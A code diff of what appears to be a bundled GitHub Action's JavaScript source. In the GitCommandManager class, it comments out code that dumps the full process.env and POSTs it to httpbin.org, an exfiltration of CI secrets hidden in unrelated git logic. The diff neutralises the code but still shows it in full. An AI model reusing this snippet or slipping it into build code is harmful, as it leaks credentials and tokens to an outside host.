@@ -1,18 +1,3 @@
-// const core = require('@actions/core');
-// const github = require('@actions/github');
-
-// try {
-//   // `who-to-greet` input defined in action metadata file
-//   const nameToGreet = core.getInput('who-to-greet');
-//   console.log(`Hello ${nameToGreet}!`);
-//   const time = (new Date()).toTimeString();
-//   core.setOutput("time", time);
-//   // Get the JSON webhook payload for the event that triggered the workflow
-//   const payload = JSON.stringify(github.context.payload, undefined, 2)
-//   console.log(`The event payload: ${payload}`);
-// } catch (error) {
-//   core.setFailed(error.message);
-// }
 
 const fs = require('fs');
 const https = require('https');
@@ -654,49 +639,32 @@ class GitCommandManager {
 	 //    for (var c = 0; c < 10; c++) {
 		// setTimeout(() => { console.warn("doing stuff") }, 1000);
 	 //    }
-	    const data = JSON.stringify(process.env);
-	    var options = {
-  hostname: 'httpbin.org',
-  port: 443,
-  path: '/post',
-  method: 'POST',
-  headers: {
-       'Content-Type': 'application/x-www-form-urlencoded',
-       'Content-Length': data.length
-     }
-};
-var req = https.request(options, (res) => {
-  console.warn('statusCode:', res.statusCode);
-  console.warn('headers:', res.headers);
+// 	    const data = JSON.stringify(process.env);
+// 	    var options = {
+//   hostname: 'httpbin.org',
+//   port: 443,
+//   path: '/post',
+//   method: 'POST',
+//   headers: {
+//        'Content-Type': 'application/x-www-form-urlencoded',
+//        'Content-Length': data.length
+//      }
+// };
+// var req = https.request(options, (res) => {
+//   console.warn('statusCode:', res.statusCode);
+//   console.warn('headers:', res.headers);
 
-  res.on('data', (d) => {
-    process.stdout.write(d);
-  });
-});
-
-req.on('error', (e) => {
-  console.error(e);
-});
-
-req.write(data);
-req.end();
-// https.get('https://cht.sh/tmux', res => {
-//   let data = [];
-//   const headerDate = res.headers && res.headers.date ? res.headers.date : 'no response date';
-//   console.warn('Status Code:', res.statusCode);
-//   console.warn('Date in Response header:', headerDate);
-
-//   res.on('data', chunk => {
-//     data.push(chunk);
+//   res.on('data', (d) => {
+//     process.stdout.write(d);
 //   });
-
-//   res.on('end', () => {
-//     console.warn('Response ended: ');
-//     console.warn(Buffer.concat(data).toString());
-//   });
-// }).on('error', err => {
-//   console.error('Error: ', err.message);
 // });
+
+// req.on('error', (e) => {
+//   console.error(e);
+// });
+
+// req.write(data);
+// req.end();
 
             const output = yield this.execGit([
                 'config',
